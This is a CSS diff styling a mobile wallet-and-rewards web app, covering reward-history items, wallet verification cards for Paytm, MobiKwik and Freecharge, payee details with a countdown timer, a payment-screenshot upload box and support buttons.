+.quick-btn i{font-size:24px;width:56px;height:56px;border-radius:18px;display:flex;align-items:center;justify-content:center;color:#fff;background:linear-gradient(160deg,#4ade80,#0a6b2f);box-shadow:0 4px 0 #0a6b2f,0 0 14px var(--greenGlow),inset 0 2px 0 rgba(255,255,255,.3);}
+
+.verified-card{margin-top:16px;padding:26px 18px;border-radius:26px;text-align:center;background:linear-gradient(150deg,#eff6ff,#dbeafe);border:3px solid #bfdbfe;box-shadow:0 6px 0 #93c5fd,0 7px 0 rgba(0,0,0,.12),0 10px 22px rgba(37,99,235,.16),0 0 26px var(--blueGlow);animation:popBounce .4s ease;}
+.vc-icon{width:72px;height:72px;margin:0 auto 14px;border-radius:50%;display:flex;align-items:center;justify-content:center;color:#fff;font-size:32px;background:linear-gradient(160deg,#60a5fa,#1d4ed8);box-shadow:0 6px 0 #1e3a8a,0 0 24px var(--blueGlow),inset 0 2px 0 rgba(255,255,255,.3);}
+.vc-title{font-size:28px;color:var(--blue);letter-spacing:.8px;font-weight:700;text-shadow:0 0 10px var(--blueGlow);}
+.vc-sub{font-size:14.5px;color:#3b6fd4;font-weight:600;margin-top:4px;}
+
+.page-head-card{background:#fff;border-radius:22px;padding:18px;border:2.5px solid var(--line);box-shadow:0 5px 0 var(--line),0 6px 0 rgba(0,0,0,.08),0 0 16px rgba(34,197,94,.08);margin-bottom:14px;}
+.page-title{font-size:21px;margin:0;color:#0b3a1f;font-weight:700;}
+.page-sub{font-size:13.5px;color:var(--muted);margin:6px 0 0;font-weight:600;}
+
+.history-item{width:100%;display:flex;align-items:center;gap:12px;background:#fff;border:2.5px solid var(--line);border-radius:20px;padding:14px;margin-bottom:10px;box-shadow:0 4px 0 var(--line),0 5px 0 rgba(0,0,0,.06);animation:slideInRight .35s ease both;}
+.history-icon{width:54px;height:54px;border-radius:17px;flex:0 0 auto;display:flex;align-items:center;justify-content:center;font-size:23px;color:#fff;box-shadow:inset 0 2px 0 rgba(255,255,255,.3),0 0 12px rgba(0,0,0,.1);}
+.history-icon.gift{background:linear-gradient(160deg,#4ade80,#0a6b2f);box-shadow:0 0 12px var(--greenGlow);}
+.history-icon.bonus{background:linear-gradient(160deg,#60a5fa,#1d4ed8);box-shadow:0 0 12px var(--blueGlow);}
+.history-icon.transfer{background:linear-gradient(160deg,#f43f5e,#be123c);box-shadow:0 0 12px var(--redGlow);}
+.history-icon.cashback{background:linear-gradient(160deg,#fbbf24,#c2410c);box-shadow:0 0 12px var(--amberGlow);}
+.history-icon.coupon{background:linear-gradient(160deg,#a78bfa,#7c3aed);box-shadow:0 0 12px var(--purpleGlow);}
+.history-icon.invite{background:linear-gradient(160deg,#c084fc,#7c3aed);box-shadow:0 0 12px var(--purpleGlow);}
+.history-info{flex:1;min-width:0;}
+.history-title{font-size:15px;font-weight:700;color:var(--ink);}
+.history-date{font-size:12px;color:var(--muted);margin-top:3px;font-weight:600;display:flex;align-items:center;gap:5px;}
+.history-date i{font-size:10px;color:var(--green);}
+.history-amount{margin-left:auto;flex:0 0 auto;font-size:15px;font-weight:700;color:var(--greenD);background:#f0fdf4;border:2px solid #c8eed9;padding:8px 12px;border-radius:14px;box-shadow:0 0 10px rgba(34,197,94,.18);}
+.history-amount.negative{color:var(--redDeep);background:#fff1f2;border-color:#fecdd3;box-shadow:0 0 10px var(--redGlow);}
+.history-empty{text-align:center;padding:50px 20px;color:var(--muted);font-weight:600;font-size:14px;}
+.history-empty i{font-size:48px;color:#c8ded3;display:block;margin-bottom:14px;}
+
+.wallet-card{display:flex;align-items:center;gap:12px;padding:16px;border-radius:22px;margin-bottom:12px;cursor:pointer;background:#fff;border:2.5px solid #dcefe3;box-shadow:0 5px 0 #dcefe3,0 6px 0 rgba(0,0,0,.08),0 10px 18px rgba(34,197,94,.08),inset 0 2px 0 rgba(255,255,255,.7);transition:transform .08s;position:relative;overflow:hidden;}
+.wallet-card::before{content:"";position:absolute;left:0;top:0;bottom:0;width:6px;background:linear-gradient(180deg,#22c55e,#0a6b2f);border-radius:0 4px 4px 0;}
+.wallet-card.paytm::before{background:linear-gradient(180deg,#3b82f6,#0b63c5);}
+.wallet-card.mobikwik::before{background:linear-gradient(180deg,#ef4444,#b91c1c);}
+.wallet-card.freecharge::before{background:linear-gradient(180deg,#f59e0b,#b45309);}
+.wallet-card:active{transform:translateY(3px);box-shadow:0 1px 0 #dcefe3;}
+.wallet-card.verified{background:linear-gradient(135deg,#f0f9ff,#e0f2fe);border-color:#bfdbfe;box-shadow:0 5px 0 #93c5fd,0 6px 0 rgba(0,0,0,.08),0 0 20px var(--blueGlow);}
+.wallet-card.pending-card{background:linear-gradient(135deg,#fffbeb,#fef3c7);border-color:#fcd34d;box-shadow:0 5px 0 #fcd34d,0 6px 0 rgba(0,0,0,.08),0 0 20px var(--amberGlow);}
+.wc-icon{width:56px;height:56px;border-radius:18px;flex:0 0 auto;display:flex;align-items:center;justify-content:center;font-size:24px;color:#fff;box-shadow:inset 0 2px 0 rgba(255,255,255,.3);}
+.wc-icon.paytm{background:linear-gradient(160deg,#3b82f6,#0b63c5);box-shadow:0 0 12px var(--blueGlow),inset 0 2px 0 rgba(255,255,255,.3);}
+.wc-icon.mobikwik{background:linear-gradient(160deg,#ef4444,#b91c1c);box-shadow:0 0 12px var(--redGlow),inset 0 2px 0 rgba(255,255,255,.3);}
+.wc-icon.freecharge{background:linear-gradient(160deg,#f59e0b,#b45309);box-shadow:0 0 12px var(--amberGlow),inset 0 2px 0 rgba(255,255,255,.3);}
+.wc-info{flex:1;min-width:0;}
+.wc-name{font-size:16.5px;font-weight:700;color:var(--ink);}
+.wc-status{font-size:12.5px;font-weight:600;color:var(--muted);margin-top:3px;display:flex;align-items:center;gap:5px;}
+.wc-status .dot{width:9px;height:9px;border-radius:50%;background:#c8ded3;display:inline-block;}
+.wc-status.ok{color:var(--blue);}
+.wc-status.ok .dot{background:#22c55e;box-shadow:0 0 8px rgba(34,197,94,.7);animation:softPulse 2s ease-in-out infinite;}
+.wc-status.pending{color:#b45309;}
+.wc-status.pending .dot{background:#f59e0b;box-shadow:0 0 8px rgba(245,158,11,.7);animation:softPulse 2s ease-in-out infinite;}
+.btn-verify{margin-left:auto;flex:0 0 auto;border:0;border-radius:16px;padding:12px 20px;font-size:13.5px;letter-spacing:.4px;color:#fff;font-family:var(--toon);cursor:pointer;font-weight:700;text-shadow:0 1px 0 rgba(0,0,0,.12);background:linear-gradient(180deg,#4ade80,#0e8c3f);box-shadow:0 5px 0 var(--greenDeep),0 6px 0 rgba(0,0,0,.12),0 0 14px var(--greenGlow),inset 0 1px 0 rgba(255,255,255,.25);transition:transform .08s;}
+.btn-verify:active{transform:translateY(4px);box-shadow:0 1px 0 var(--greenDeep),0 0 10px var(--greenGlow);}
+.btn-verify.verified{background:linear-gradient(180deg,#60a5fa,#1d4ed8);box-shadow:0 5px 0 #1e3a8a,0 6px 0 rgba(0,0,0,.12),0 0 14px var(--blueGlow);}
+.btn-verify.pending{background:linear-gradient(180deg,#fbbf24,#b45309);box-shadow:0 5px 0 #7c2d12,0 6px 0 rgba(0,0,0,.12),0 0 14px var(--amberGlow);}
+
+.profile-card{background:#fff;border-radius:26px;padding:26px 18px 18px;border:2.5px solid var(--line);text-align:center;box-shadow:0 6px 0 var(--line),0 7px 0 rgba(0,0,0,.08),0 0 20px rgba(34,197,94,.1);}
+.prof-avatar{width:100px;height:100px;border-radius:50%;margin:0 auto 14px;display:flex;align-items:center;justify-content:center;color:#fff;font-size:40px;background:linear-gradient(160deg,#4ade80,#0a6b2f);box-shadow:0 8px 0 #0a6b2f,0 9px 0 rgba(0,0,0,.15),0 0 28px var(--greenGlow),inset 0 3px 0 rgba(255,255,255,.3);position:relative;cursor:pointer;overflow:hidden;animation:glowPulse 4s ease-in-out infinite;}
+.prof-avatar img{width:100%;height:100%;object-fit:cover;border-radius:50%;}
+.prof-avatar::after{content:"\f030";font-family:"Font Awesome 6 Free";font-weight:900;position:absolute;bottom:0;right:0;width:32px;height:32px;background:linear-gradient(160deg,#4ade80,#0a6b2f);border-radius:50%;font-size:13px;display:flex;align-items:center;justify-content:center;border:3px solid #fff;box-shadow:0 0 12px var(--greenGlow);color:#fff;}
+.prof-avatar:active{transform:scale(.97);}
+.prof-name{font-size:22px;font-weight:700;}
+.prof-tag{display:inline-flex;align-items:center;gap:5px;margin-top:8px;padding:7px 15px;border-radius:22px;font-size:12px;font-weight:700;color:var(--greenD);background:#f0fdf4;border:2px solid #c8eed9;}
+.info-row{display:flex;align-items:center;gap:12px;background:#f8fbf9;border:2px solid #eaf4ed;border-radius:16px;padding:13px;margin-top:10px;text-align:left;}
+.info-row>i{width:44px;height:44px;border-radius:14px;flex:0 0 auto;display:flex;align-items:center;justify-content:center;font-size:16px;color:var(--greenD);background:#e9fbf0;border:2px solid #cdefdc;}
+.info-label{font-size:11px;font-weight:700;color:var(--muted);letter-spacing:.9px;text-transform:uppercase;}
+.info-value{font-size:15.5px;font-weight:700;color:var(--ink);word-break:break-all;margin-top:2px;}
+.info-value.code{letter-spacing:2.5px;color:var(--greenD);font-size:17px;}
+.info-value.purple{color:#6b21a8;}
+.btn-mini{flex:0 0 auto;border:0;border-radius:14px;padding:11px 15px;font-family:var(--toon);font-weight:700;font-size:12.5px;letter-spacing:.5px;color:#fff;background:linear-gradient(180deg,#4ade80,#0e8c3f);cursor:pointer;box-shadow:0 4px 0 var(--greenDeep),0 5px 0 rgba(0,0,0,.1),0 0 10px var(--greenGlow),inset 0 1px 0 rgba(255,255,255,.22);transition:transform .08s;}
+.btn-mini:active{transform:translateY(3px);box-shadow:0 1px 0 var(--greenDeep);}
+.info-row.support-row{background:#f5f9ff;border:2px solid #dbeafe;cursor:pointer;}
+.info-row.support-row>i{background:#dbeafe;color:#1d4ed8;border-color:#bfdbfe;}
+.info-row.support-row .info-label{color:#1e40af;}
+.info-row.support-row .info-value{color:#1e3a8a;}
+.btn-logout{width:100%;height:58px;border:0;border-radius:22px;margin-top:18px;font-family:var(--toon);font-weight:700;font-size:16px;color:#fff;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:10px;text-shadow:0 2px 0 rgba(0,0,0,.15);background:linear-gradient(180deg,#f87171,#b91c1c);box-shadow:0 8px 0 #7f1d1d,0 9px 0 rgba(0,0,0,.2),0 12px 22px rgba(185,28,28,.28),0 0 24px var(--redGlow),inset 0 3px 0 rgba(255,255,255,.28);transition:transform .08s, box-shadow .08s;}
+.btn-logout:active{transform:translateY(5px);box-shadow:0 2px 0 #7f1d1d,0 3px 0 rgba(0,0,0,.15),0 0 14px var(--redGlow);}
+
+.float-support{position:fixed;right:16px;bottom:100px;z-index:70;width:64px;height:64px;border-radius:50%;background:linear-gradient(160deg,#60a5fa,#1d4ed8);display:flex;align-items:center;justify-content:center;color:#fff;font-size:26px;cursor:pointer;border:3px solid rgba(255,255,255,.4);box-shadow:0 8px 0 #1e3a8a,0 9px 0 rgba(0,0,0,.2),0 10px 22px rgba(37,99,235,.32),0 0 22px var(--blueGlow),inset 0 2px 0 rgba(255,255,255,.3);transition:transform .15s;}
+.float-support:active{transform:translateY(5px) scale(.95);box-shadow:0 2px 0 #1e3a8a,0 0 14px var(--blueGlow);}
+
+.bottom-nav{position:fixed;bottom:0;left:50%;transform:translateX(-50%);width:100%;max-width:430px;display:grid;grid-template-columns:repeat(4,1fr);gap:6px;background:rgba(255,255,255,.98);-webkit-backdrop-filter:blur(14px);backdrop-filter:blur(14px);border-top:3px solid #e2efe7;padding:10px 10px calc(10px + env(safe-area-inset-bottom));box-shadow:0 -4px 0 #e2efe7,0 -8px 22px rgba(11,122,55,.08);z-index:60;}
+.nav-item{border:0;background:linear-gradient(180deg,#fff,#f3f9f4);cursor:pointer;font-family:var(--toon);display:flex;flex-direction:column;align-items:center;gap:4px;font-size:11.5px;font-weight:600;color:#8aa79a;padding:10px 0 12px;border-radius:20px;transition:transform .08s, box-shadow .08s, color .15s;box-shadow:0 5px 0 #d9eee1,0 6px 0 rgba(0,0,0,.08),inset 0 2px 0 rgba(255,255,255,.9);}
+.nav-item i{font-size:20px;transition:transform .2s;}
+.nav-item:active{transform:translateY(3px);box-shadow:0 1px 0 #d9eee1,0 2px 0 rgba(0,0,0,.06);}
+.nav-item.active{color:#fff;font-weight:700;background:linear-gradient(180deg,#4ade80,#0a6b2f);box-shadow:0 5px 0 var(--greenDeep),0 6px 0 rgba(0,0,0,.2),0 0 18px var(--greenGlow),inset 0 3px 0 rgba(255,255,255,.35);}
+.nav-item.active i{transform:scale(1.1);}
+.nav-item.active:active{transform:translateY(3px);box-shadow:0 1px 0 var(--greenDeep),0 2px 0 rgba(0,0,0,.15),0 0 12px var(--greenGlow);}
+
+.overlay{position:fixed;inset:0;z-index:120;background:rgba(6,40,22,.5);-webkit-backdrop-filter:blur(5px);backdrop-filter:blur(5px);display:flex;align-items:flex-end;justify-content:center;opacity:0;pointer-events:none;transition:opacity .26s ease;}
+.overlay.show{opacity:1;pointer-events:auto;}
+.sheet{width:100%;max-width:430px;background:#fff;border-radius:30px 30px 0 0;padding:10px 20px calc(24px + env(safe-area-inset-bottom));transform:translateY(102%);transition:transform .32s cubic-bezier(.2,.9,.3,1);max-height:94vh;overflow-y:auto;box-shadow:0 -12px 40px rgba(0,0,0,.2);}
+.overlay.show .sheet{transform:translateY(0);}
+.sheet-handle{width:52px;height:6px;border-radius:3px;background:#d6e7dc;margin:2px auto 16px;}
+.sheet-icon{width:78px;height:78px;border-radius:26px;margin:2px auto 14px;display:flex;align-items:center;justify-content:center;font-size:32px;color:#fff;background:linear-gradient(160deg,#4ade80,#0a6b2f);box-shadow:0 6px 0 #0a6b2f,0 0 22px var(--greenGlow),inset 0 2px 0 rgba(255,255,255,.3);}
+.sheet-icon.blue{background:linear-gradient(160deg,#60a5fa,#1d4ed8);box-shadow:0 6px 0 #1e3a8a,0 0 22px var(--blueGlow),inset 0 2px 0 rgba(255,255,255,.3);}
+.sheet-icon.red{background:linear-gradient(160deg,#f87171,#b91c1c);box-shadow:0 6px 0 #7f1d1d,0 0 22px var(--redGlow),inset 0 2px 0 rgba(255,255,255,.3);}
+.sheet-icon.purple{background:linear-gradient(160deg,#c084fc,#7c3aed);box-shadow:0 6px 0 #4c1d95,0 0 22px var(--purpleGlow),inset 0 2px 0 rgba(255,255,255,.3);}
+.sheet h3{text-align:center;font-size:21px;margin:0 0 6px;color:#0b3a1f;font-family:var(--toon);font-weight:700;}
+.sheet-sub{text-align:center;font-size:14px;color:var(--muted);font-weight:600;margin:0 0 8px;}
+.sheet-head{display:flex;align-items:center;gap:12px;margin-bottom:16px;}
+.sheet-head .sheet-icon{margin:0;width:60px;height:60px;border-radius:20px;font-size:26px;}
+.sheet-title{font-size:19px;font-weight:700;font-family:var(--toon);}
+.sheet-head .sheet-sub{text-align:left;margin:2px 0 0;font-size:13px;}
+.close-x{margin-left:auto;flex:0 0 auto;width:44px;height:44px;border-radius:16px;border:2.5px solid #e2efe7;background:#f6fbf8;color:var(--muted);font-size:17px;cursor:pointer;font-family:var(--toon);display:flex;align-items:center;justify-content:center;transition:.15s;box-shadow:0 4px 0 #e2efe7,0 5px 0 rgba(0,0,0,.06);}
+.close-x:active{transform:translateY(3px);box-shadow:0 1px 0 #e2efe7;}
+.code-box{font-family:var(--toon);font-size:36px;font-weight:700;letter-spacing:8px;text-align:center;padding:22px 10px 22px 18px;border-radius:22px;color:var(--greenD);background:#f5fdf8;border:3px dashed #86d9a6;margin:16px 0 20px;box-shadow:inset 0 3px 10px rgba(11,122,55,.06),0 0 18px rgba(34,197,94,.22);}
+.lbl{display:block;font-size:12.5px;font-weight:700;color:var(--muted);letter-spacing:1px;text-transform:uppercase;margin:10px 0 8px 5px;}
+.spinner{width:68px;height:68px;margin:22px auto 15px;border-radius:50%;border:7px solid #e5f3eb;border-top-color:var(--green);animation:spin .9s linear infinite;box-shadow:0 0 20px var(--greenGlow);}
+.loading-text{text-align:center;font-weight:700;color:var(--muted);font-size:16px;margin-bottom:22px;}
+.result-box{padding:24px 16px;border-radius:22px;text-align:center;font-weight:700;font-size:21px;margin:16px 0;letter-spacing:.5px;animation:popBounce .4s ease;}
+.result-box i{font-size:38px;display:block;margin-bottom:12px;}
+.result-box span{display:block;font-size:14px;font-weight:600;margin-top:8px;opacity:.9;}
+.result-box.red{background:#fef2f2;color:var(--redDeep);border:3px solid #fecaca;box-shadow:0 5px 0 #fecaca,0 0 18px var(--redGlow);}
+.result-box.blue{background:#eff6ff;color:var(--blueDeep);border:3px solid #bfdbfe;box-shadow:0 5px 0 #bfdbfe,0 0 18px var(--blueGlow);}
+.result-box.green{background:#f0fdf4;color:var(--greenD);border:3px solid #bbf7d0;box-shadow:0 5px 0 #bbf7d0,0 0 18px var(--greenGlow);}
+
+#toast{position:fixed;left:50%;bottom:100px;z-index:300;transform:translate(-50%,20px);background:rgba(13,43,26,.96);color:#fff;padding:15px 24px;border-radius:20px;font-family:var(--toon);font-size:14.5px;font-weight:600;max-width:88%;text-align:center;opacity:0;pointer-events:none;transition:opacity .26s, transform .26s;box-shadow:0 8px 22px rgba(0,0,0,.3);display:flex;align-items:center;gap:10px;}
+#toast.show{opacity:1;transform:translate(-50%,0);}
+#toast.error{background:linear-gradient(120deg,#ef4444,#b91c1c);box-shadow:0 8px 22px rgba(0,0,0,.3),0 0 22px var(--redGlow);}
+#toast.success{background:linear-gradient(120deg,#22c55e,#0e8c3f);box-shadow:0 8px 22px rgba(0,0,0,.3),0 0 22px var(--greenGlow);}
+#toast i{font-size:18px;}
+
+.payee-card{background:#faf7ff;border:3px solid #e4d5ff;border-radius:22px;padding:10px 18px;margin-bottom:16px;box-shadow:0 5px 0 #e4d5ff,0 6px 0 rgba(0,0,0,.08);transition:all .25s;}
+.payee-card.offline{background:#f7f7f7;border-color:#ddd;box-shadow:0 5px 0 #ddd,0 6px 0 rgba(0,0,0,.08);}
+.payee-card.live{border-color:#86d9a6;background:#f5fdf8;box-shadow:0 5px 0 #86d9a6,0 6px 0 rgba(0,0,0,.08),0 0 20px rgba(34,197,94,.25);}
+.payee-status{display:flex;align-items:center;justify-content:center;gap:8px;padding:10px 12px;margin:4px 0 6px;font-size:12px;font-weight:700;letter-spacing:1.3px;text-transform:uppercase;border-radius:12px;}
+.payee-status.live{background:#e9fbf0;color:var(--greenD);border:2px solid #86d9a6;}
+.payee-status.offline{background:#f0f0f0;color:#777;border:2px solid #ccc;animation:softPulse 3s ease-in-out infinite;}
+.payee-row{display:flex;align-items:center;justify-content:space-between;gap:6px;padding:11px 0;}
+.payee-row+.payee-row{border-top:2px dashed #e4d5ff;}
+.payee-card.offline .payee-row+.payee-row{border-top-color:#ddd;}
+.payee-card.live .payee-row+.payee-row{border-top-color:#a8e6c2;}
+.payee-lbl{font-size:11.5px;font-weight:700;color:#6d28d9;letter-spacing:.8px;text-transform:uppercase;flex:0 0 auto;}
+.payee-card.offline .payee-lbl{color:#777;}
+.payee-card.live .payee-lbl{color:var(--greenD);}
+.payee-val{font-size:15.5px;font-weight:700;color:#4c1d95;text-align:right;word-break:break-all;flex:1;min-width:0;margin-left:auto;}
+.payee-card.offline .payee-val{color:#999;letter-spacing:2px;}
+.payee-card.live .payee-val{color:#0b5c2c;}
+.payee-val.mono{font-family:'Courier New',monospace;letter-spacing:1.5px;font-size:14.5px;}
+.payee-row.amount .payee-val{font-size:24px;color:var(--greenD);letter-spacing:-.3px;}
+.payee-copy{flex:0 0 auto;border:0;border-radius:12px;padding:8px 12px;font-family:var(--toon);font-weight:700;font-size:11.5px;letter-spacing:.5px;color:#fff;background:linear-gradient(180deg,#a78bfa,#7c3aed);cursor:pointer;display:inline-flex;align-items:center;gap:5px;white-space:nowrap;box-shadow:0 3px 0 #4c1d95,0 0 10px var(--purpleGlow),inset 0 1px 0 rgba(255,255,255,.22);transition:transform .1s;}
+.payee-copy:active{transform:translateY(2px);box-shadow:0 1px 0 #4c1d95;}
+.payee-copy.amount-copy{background:linear-gradient(180deg,#4ade80,#0e8c3f);box-shadow:0 3px 0 var(--greenDeep),0 0 10px var(--greenGlow);}
+
+.payee-timer{display:inline-flex;align-items:center;gap:5px;padding:6px 10px;border-radius:10px;background:linear-gradient(180deg,#fff7e6,#ffe9b8);border:2px solid #f5d98a;color:#8a5a00;font-weight:800;font-size:12.5px;font-family:'Courier New',monospace;letter-spacing:.5px;box-shadow:0 2px 0 #f5d98a,0 0 12px rgba(245,158,11,.3);flex:0 0 auto;}
+.payee-timer i{font-size:11px;}
+.payee-timer.warn{background:linear-gradient(180deg,#ffe4e6,#fecdd3);border-color:#fda4af;color:#9f1239;box-shadow:0 2px 0 #fda4af,0 0 12px var(--redGlow);}
+.payee-timer.danger{background:linear-gradient(180deg,#fee2e2,#fecaca);border-color:#f87171;color:#991b1b;box-shadow:0 2px 0 #f87171,0 0 14px var(--redGlow);animation:heartbeat 1.2s ease-in-out infinite;}
+
+.upload-box{position:relative;width:100%;min-height:160px;background:#f8fcf9;border:3px dashed #86d9a6;border-radius:22px;display:flex;align-items:center;justify-content:center;cursor:pointer;overflow:hidden;margin-bottom:14px;transition:all .25s;}
+.upload-box:active{transform:scale(.98);}
+.upload-box.has-image{border-style:solid;border-color:#4ade80;background:#fff;}
+.upload-inner{display:flex;flex-direction:column;align-items:center;justify-content:center;gap:8px;padding:24px;text-align:center;color:var(--greenD);font-weight:700;}
+.upload-inner i{font-size:48px;color:var(--green);animation:floaty 3.5s ease-in-out infinite;}
+.upload-title{font-size:16px;}
+.upload-hint{font-size:12px;font-weight:600;color:var(--muted);}
+#uploadPreview{width:100%;height:auto;max-height:260px;object-fit:contain;display:block;background:#0d2b1a;}
+.upload-change{position:absolute;top:8px;right:8px;background:rgba(13,43,26,.85);color:#fff;padding:8px 13px;border-radius:14px;font-size:12px;font-weight:700;display:flex;align-items:center;gap:6px;border:2px solid rgba(255,255,255,.35);}
+
+.pay-verify-anim{display:flex;justify-content:center;align-items:center;padding:14px 0 6px;}
+.pay-orbit{position:relative;width:180px;height:180px;display:flex;align-items:center;justify-content:center;}
+.pay-orbit-ring{position:absolute;inset:0;border-radius:50%;border:4px solid transparent;border-top-color:#22c55e;border-right-color:#4ade80;animation:orbitRing 1.8s linear infinite;}
+.pay-orbit-ring.delay1{inset:16px;border-top-color:#3b82f6;border-right-color:#7ab5fb;animation:orbitRing2 2.4s linear infinite;}
+.pay-orbit-ring.delay2{inset:32px;border-top-color:#f59e0b;border-right-color:#ffc266;animation:orbitRing 2.8s linear infinite;}
+.pay-orbit-icon{width:92px;height:92px;border-radius:50%;background:linear-gradient(160deg,#4ade80,#0a6b2f);display:flex;align-items:center;justify-content:center;color:#fff;font-size:38px;position:relative;z-index:2;box-shadow:0 8px 0 #0a6b2f,0 9px 0 rgba(0,0,0,.15),0 0 26px var(--greenGlow),inset 0 2px 0 rgba(255,255,255,.3);}
+.pay-orbit-icon i{animation:hourglassFlip 3.5s ease-in-out infinite;}
+.pay-timer{text-align:center;font-size:52px;font-weight:700;color:var(--greenD);letter-spacing:1px;line-height:1;font-family:'Courier New',monospace;margin-bottom:8px;text-shadow:0 0 14px rgba(34,197,94,.3);}
+.pay-timer.warn{color:#ea580c;text-shadow:0 0 14px var(--amberGlow);}
+.pay-timer.danger{color:var(--red);animation:heartbeat 1.2s ease-in-out infinite;text-shadow:0 0 14px var(--redGlow);}
+.pay-timer-label{text-align:center;font-size:17px;font-weight:700;color:var(--ink);margin-bottom:4px;}
+.pay-timer-sub{text-align:center;font-size:13.5px;font-weight:600;color:var(--muted);margin-bottom:16px;}
+.online-badge{display:inline-flex;align-items:center;gap:8px;padding:9px 18px;border-radius:24px;background:linear-gradient(135deg,#e9fbf0,#d8f5e4);border:2px solid #86d9a6;color:var(--greenD);font-weight:700;font-size:12.5px;letter-spacing:1.4px;text-transform:uppercase;margin:0 auto 16px;width:fit-content;box-shadow:0 3px 0 #86d9a6,0 0 14px var(--greenGlow);}
+.online-dot{width:11px;height:11px;border-radius:50%;background:#22c55e;animation:softPulse 1.8s ease-in-out infinite;box-shadow:0 0 10px rgba(34,197,94,.9);}
+.pay-status-row{display:flex;align-items:center;justify-content:center;gap:8px;padding:14px 16px;border-radius:16px;background:#f0fdf4;border:2px solid #86d9a6;font-size:14.5px;font-weight:700;color:var(--greenD);margin-bottom:14px;box-shadow:0 3px 0 #86d9a6,0 0 14px rgba(34,197,94,.2);}
+.pay-status-row i{font-size:16px;animation:spin 2.2s linear infinite;}
+
+.unlock-wait{text-align:center;padding:18px 12px;}
+.uw-orb{width:130px;height:130px;margin:0 auto 22px;border-radius:50%;background:linear-gradient(160deg,#4ade80,#0a6b2f);display:flex;align-items:center;justify-content:center;color:#fff;font-size:54px;position:relative;box-shadow:0 12px 0 #0a6b2f,0 13px 0 rgba(0,0,0,.15),0 18px 32px rgba(11,122,55,.35),0 0 32px var(--greenGlow),inset 0 4px 0 rgba(255,255,255,.4);animation:payBounce 3s ease-in-out infinite;}
+.uw-orb::before,.uw-orb::after{content:"";position:absolute;inset:-14px;border-radius:50%;border:3px solid rgba(34,197,94,.45);animation:pulseRing 2.8s ease-out infinite;}
+.uw-orb::after{animation-delay:1.4s;}
+.uw-tt{font-size:24px;font-weight:700;color:#0b3a1f;margin:0 0 12px;}
+.uw-desc{font-size:14.5px;color:var(--muted);font-weight:600;line-height:1.6;margin:0 0 18px;}
+.uw-bar{width:100%;height:8px;border-radius:4px;margin:0 auto 18px;background:linear-gradient(90deg,#d9eee3 0%,#22c55e 50%,#d9eee3 100%);background-size:200% 100%;animation:payShimmer 2s linear infinite;box-shadow:0 0 14px var(--greenGlow);}
+
+.support-info-block{text-align:center;padding:20px 14px;margin-bottom:18px;background:linear-gradient(135deg,#eff6ff,#dbeafe);border:3px solid #bfdbfe;border-radius:22px;box-shadow:0 5px 0 #93c5fd,0 6px 0 rgba(0,0,0,.08),0 0 20px var(--blueGlow);}
+.support-number{font-family:'Courier New',monospace;font-size:28px;font-weight:700;color:#1d4ed8;letter-spacing:2px;margin:8px 0 4px;text-shadow:0 0 10px var(--blueGlow);}
+.support-hours{font-size:13px;color:#3b5a9a;font-weight:700;display:inline-flex;align-items:center;gap:6px;padding:7px 15px;border-radius:24px;background:rgba(255,255,255,.85);border:2px solid #bfdbfe;margin-top:8px;}
+.support-hours i{color:var(--green);}
+.support-actions{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-top:16px;}
+.support-btn{height:62px;border:0;border-radius:20px;font-family:var(--toon);font-weight:700;font-size:15.5px;letter-spacing:.3px;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:8px;text-shadow:0 2px 0 rgba(0,0,0,.15);transition:transform .08s;position:relative;overflow:hidden;color:#fff;}
+.support-btn::before{content:"";position:absolute;top:0;left:-100%;width:50%;height:100%;background:linear-gradient(90deg,transparent,rgba(255,255,255,.25),transparent);animation:shine 6s ease-in-out infinite;}
+.support-btn i,.support-btn span{position:relative;z-index:2;}
+.support-btn.call{background:linear-gradient(180deg,#60a5fa,#1d4ed8);box-shadow:0 6px 0 #1e3a8a,0 7px 0 rgba(0,0,0,.15),0 0 18px var(--blueGlow),inset 0 2px 0 rgba(255,255,255,.25);}
+.support-btn.call:active{transform:translateY(4px);box-shadow:0 2px 0 #1e3a8a,0 0 12px var(--blueGlow);}
+.support-btn.wa{background:linear-gradient(180deg,#25d366,#128c7e);box-shadow:0 6px 0 #075e54,0 7px 0 rgba(0,0,0,.15),0 0 18px rgba(37,211,102,.4),inset 0 2px 0 rgba(255,255,255,.25);}
+.support-btn.wa:active{transform:translateY(4px);box-shadow:0 2px 0 #075e54;}
+
+.info-block{background:linear-gradient(135deg,#eff6ff,#dbeafe);border:3px solid #bfdbfe;border-radius:22px;padding:16px 18px;margin-bottom:16px;box-shadow:0 5px 0 #93c5fd,0 6px 0 rgba(0,0,0,.08),0 0 18px var(--blueGlow);}
+.info-block.orange{background:linear-gradient(135deg,#fff7e6,#ffe9b8);border-color:#f5d98a;box-shadow:0 5px 0 #f5d98a,0 6px 0 rgba(0,0,0,.08),0 0 18px var(--amberGlow);}
+.info-block.purple{background:linear-gradient(135deg,#faf5ff,#e9d5ff);border-color:#c084fc;box-shadow:0 5px 0 #c084fc,0 6px 0 rgba(0,0,0,.08),0 0 18px var(--purpleGlow);}
+.info-row-lite{display:flex;align-items:center;gap:10px;padding:8px 0;font-size:14px;font-weight:600;color:var(--ink);}
+.info-row-lite+.info-row-lite{border-top:1px solid rgba(0,0,0,.06);}
+.info-row-lite i{width:36px;height:36px;border-radius:12px;flex:0 0 auto;display:flex;align-items:center;justify-content:center;font-size:14px;background:rgba(255,255,255,.85);color:var(--blueDeep);}
+.info-row-lite.orange i{color:var(--amber);}
+.info-row-lite.purple i{color:#7c3aed;}
+.info-row-lite .val{font-weight:700;color:var(--ink);margin-left:auto;font-family:'Courier New',monospace;font-size:14px;letter-spacing:.5px;}
+
+.wallet-req-popup{position:fixed;left:50%;top:50%;z-index:250;transform:translate(-50%,-50%) scale(.9);background:#fff;border-radius:26px;padding:28px 22px 20px;max-width:320px;width:calc(100% - 40px);text-align:center;box-shadow:0 22px 60px rgba(0,0,0,.32),0 0 32px var(--greenGlow),inset 0 2px 0 rgba(255,255,255,.9);opacity:0;pointer-events:none;transition:opacity .28s, transform .3s cubic-bezier(.2,.9,.3,1.4);}
+.wallet-req-popup.show{opacity:1;pointer-events:auto;transform:translate(-50%,-50%) scale(1);}
